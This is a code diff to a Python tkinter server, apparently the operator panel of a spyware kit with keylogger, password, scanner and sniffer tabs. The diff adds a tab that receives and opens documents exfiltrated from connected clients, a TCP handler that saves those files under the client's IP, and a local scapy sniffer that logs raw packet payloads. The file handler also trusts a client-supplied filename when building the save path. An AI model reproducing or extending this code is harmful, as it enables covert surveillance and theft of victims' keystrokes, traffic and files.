@@ -20,6 +20,13 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
+import subprocess
+
+try:
+    from scapy.all import sniff as scapy_sniff, IP, IPv6, TCP, UDP, Raw
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
 
 # ── Configuración ──────────────────────────────────────────
 DEFAULT_HOST = "0.0.0.0"
@@ -27,6 +34,7 @@ DEFAULT_PORT = 9999
 LOG_DIR = "logs"
 SCREENSHOT_DIR = "screenshots"
 SNIFF_DIR = "sniff_captures"
+FILE_DIR = "received_files"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 
@@ -69,8 +77,9 @@ class ServerApp:
         self.running = False
         self.email_enabled = True
         self.clients_count = 0
+        self.server_ip = self._get_local_ip()
 
-        for d in [LOG_DIR, SCREENSHOT_DIR, SNIFF_DIR]:
+        for d in [LOG_DIR, SCREENSHOT_DIR, SNIFF_DIR, FILE_DIR]:
             os.makedirs(d, exist_ok=True)
 
         self._build_gui()
@@ -146,6 +155,7 @@ class ServerApp:
         self._build_scanner_tab()
         self._build_password_tab()
         self._build_sniffer_tab()
+        self._build_files_tab()
 
     # ══════════════════════════════════════════════════════
     #  TAB 1: KEYLOGGER
@@ -456,8 +466,13 @@ class ServerApp:
         frame = tk.Frame(self.notebook, bg=bg)
         self.notebook.add(frame, text="📡 Sniffer")
 
-        tk.Label(frame, text="Capturas de tráfico recibidas de los clientes:",
-                 bg=bg, fg="#e0e0e0", font=("Helvetica", 10)).pack(anchor="w", padx=5, pady=5)
+        top = tk.Frame(frame, bg=bg, pady=5)
+        top.pack(fill=tk.X)
+        tk.Label(top, text="Tráfico de red (Local + Clientes):",
+                 bg=bg, fg="#e0e0e0", font=("Helvetica", 10)).pack(side=tk.LEFT, padx=5)
+        
+        tk.Button(top, text="🗑 Limpiar", font=("Helvetica", 9),
+                  bg="#e94560", fg="white", command=self._clear_sniff_log).pack(side=tk.RIGHT, padx=5)
 
         self.sniff_log = scrolledtext.ScrolledText(frame, bg="#0d1117", fg="#79c0ff",
                                                     font=("Courier", 10), state=tk.DISABLED, wrap=tk.WORD)
@@ -467,13 +482,149 @@ class ServerApp:
         self.sniff_log.tag_config("file", foreground="#3fb950")
         self.sniff_log.tag_config("intel", foreground="#f0c040") # Oro para inteligencia de red
 
-    def _sniff_append(self, text, tag="info"):
+    def _build_files_tab(self):
+        bg = "#1a1a2e"
+        frame = tk.Frame(self.notebook, bg=bg)
+        self.notebook.add(frame, text="📁 Archivos")
+
+        top = tk.Frame(frame, bg=bg, pady=5)
+        top.pack(fill=tk.X)
+        tk.Label(top, text="Documentos recibidos de los clientes:",
+                 bg=bg, fg="#e0e0e0", font=("Helvetica", 10)).pack(side=tk.LEFT, padx=5)
+        
+        tk.Button(top, text="🔄 Actualizar", font=("Helvetica", 9),
+                  bg="#0f3460", fg="white", command=self._refresh_files_list).pack(side=tk.RIGHT, padx=5)
+
+        # Tabla de archivos
+        columns = ("name", "size", "client", "date")
+        self.files_tree = ttk.Treeview(frame, columns=columns, show="headings", selectmode="browse")
+        self.files_tree.heading("name", text="Nombre del Archivo")
+        self.files_tree.heading("size", text="Tamaño")
+        self.files_tree.heading("client", text="Cliente")
+        self.files_tree.heading("date", text="Fecha")
+        
+        self.files_tree.column("name", width=300)
+        self.files_tree.column("size", width=100)
+        self.files_tree.column("client", width=120)
+        self.files_tree.column("date", width=150)
+        
+        self.files_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        btn_row = tk.Frame(frame, bg=bg, pady=5)
+        btn_row.pack(fill=tk.X)
+        
+        tk.Button(btn_row, text="👁 Visualizar / Abrir", font=("Helvetica", 10, "bold"),
+                  bg="#28a745", fg="white", cursor="hand2", padx=15,
+                  command=self._open_selected_file).pack(side=tk.LEFT, padx=5)
+        
+        tk.Button(btn_row, text="🗑 Eliminar", font=("Helvetica", 10, "bold"),
+                  bg="#e94560", fg="white", cursor="hand2", padx=15,
+                  command=self._delete_selected_file).pack(side=tk.LEFT, padx=5)
+
+    def _refresh_files_list(self):
+        # Limpiar tabla
+        for item in self.files_tree.get_children():
+            self.files_tree.delete(item)
+            
+        if not os.path.exists(FILE_DIR):
+            return
+            
+        for fname in sorted(os.listdir(FILE_DIR)):
+            path = os.path.join(FILE_DIR, fname)
+            if os.path.isfile(path):
+                stats = os.stat(path)
+                size = f"{stats.st_size / 1024:.1f} KB"
+                date = datetime.fromtimestamp(stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
+                
+                # Intentar extraer IP del nombre si sigue el patrón file_IP_ts_name
+                client = "Desconocido"
+                parts = fname.split("_")
+                if len(parts) >= 3 and parts[0] == "doc":
+                    client = parts[1]
+                
+                self.files_tree.insert("", tk.END, values=(fname, size, client, date))
+
+    def _open_selected_file(self):
+        selected = self.files_tree.selection()
+        if not selected:
+            messagebox.showwarning("Atención", "Selecciona un archivo para visualizar")
+            return
+        
+        fname = self.files_tree.item(selected[0])["values"][0]
+        path = os.path.abspath(os.path.join(FILE_DIR, fname))
+        
+        try:
+            if os.name == 'nt': # Windows
+                os.startfile(path)
+            elif os.name == 'posix': # Linux / macOS
+                import subprocess
+                subprocess.call(('xdg-open', path))
+        except Exception as e:
+            messagebox.showerror("Error", f"No se pudo abrir el archivo: {e}")
+
+    def _delete_selected_file(self):
+        selected = self.files_tree.selection()
+        if not selected: return
+        
+        fname = self.files_tree.item(selected[0])["values"][0]
+        path = os.path.join(FILE_DIR, fname)
+        
+        if messagebox.askyesno("Confirmar", f"¿Eliminar {fname}?"):
+            try:
+                os.remove(path)
+                self._refresh_files_list()
+            except Exception as e:
+                messagebox.showerror("Error", f"No se pudo eliminar: {e}")
+
+    def _sniff_append(self, text, tag=""):
         def _do():
             self.sniff_log.config(state=tk.NORMAL)
             self.sniff_log.insert(tk.END, text, tag)
             self.sniff_log.see(tk.END)
             self.sniff_log.config(state=tk.DISABLED)
         self.root.after(0, _do)
+
+    def _clear_sniff_log(self):
+        self.sniff_log.config(state=tk.NORMAL)
+        self.sniff_log.delete(1.0, tk.END)
+        self.sniff_log.config(state=tk.DISABLED)
+
+    # ── Sniffer Local (Opcional) ──────────────────────────
+
+    def _start_local_sniffer(self):
+        if SCAPY_AVAILABLE:
+            threading.Thread(target=self._run_local_sniffer, daemon=True).start()
+            self._sniff_append("📡 Sniffer local iniciado en el servidor.\n", "info")
+        else:
+            self._sniff_append("⚠ Scapy no detectado. Sniffer local desactivado.\n", "error")
+
+    def _run_local_sniffer(self):
+        def packet_callback(pkt):
+            if not self.running: return
+            if IP in pkt or IPv6 in pkt:
+                layer = IP if IP in pkt else IPv6
+                src, dst = pkt[layer].src, pkt[layer].dst
+                proto = "TCP" if TCP in pkt else ("UDP" if UDP in pkt else "OTHER")
+                ts = datetime.now().strftime("%H:%M:%S")
+                
+                # Resumen simple para el log del servidor
+                msg = f"[{ts}] [LOCAL] {src} -> {dst} ({proto})\n"
+                
+                # Si hay Raw data (posible conversación)
+                if Raw in pkt:
+                    try:
+                        payload = pkt[Raw].load.decode(errors="replace")
+                        clean = ''.join(c if c.isprintable() or c in "\n\r\t" else "." for c in payload)
+                        if clean.strip():
+                            msg += f"   💬 Data: {clean[:60]}...\n"
+                    except: pass
+                
+                self._sniff_append(msg, "pkt")
+
+        try:
+            scapy_sniff(prn=packet_callback, store=False, stop_filter=lambda x: not self.running)
+        except Exception as e:
+            self._sniff_append(f"❌ Error sniffer local: {e}\n", "error")
 
     # ══════════════════════════════════════════════════════
     #  SERVIDOR TCP
@@ -514,6 +665,8 @@ class ServerApp:
         self.status_label.config(text="● Activo", fg="#3fb950")
 
         threading.Thread(target=self._run_server, args=(host, port), daemon=True).start()
+        self._start_local_sniffer()
+        self._refresh_files_list()
 
     def _run_server(self, host, port):
         try:
@@ -611,6 +764,16 @@ class ServerApp:
                         text = payload.decode("utf-8", errors="replace")
                         self._sniff_append(f"[{client_ip}] {text}", "pkt")
                         self._sniff_append(f"  📁 Guardado: {fname}\n", "file")
+
+                    elif msg_type == "file":
+                        orig_fname = header.get("filename", "unknown_file")
+                        ts_file = datetime.now().strftime("%H%M%S")
+                        new_fname = f"doc_{client_ip}_{ts_file}_{orig_fname}"
+                        path = os.path.join(FILE_DIR, new_fname)
+                        with open(path, "wb") as f:
+                            f.write(payload)
+                        self._log(f"📁 [{client_ip}] Documento recibido: {orig_fname}", "success")
+                        self.root.after(0, self._refresh_files_list)
 
         except ConnectionError:
             self._log(f"❌ Desconectado: {client_ip}", "warning")
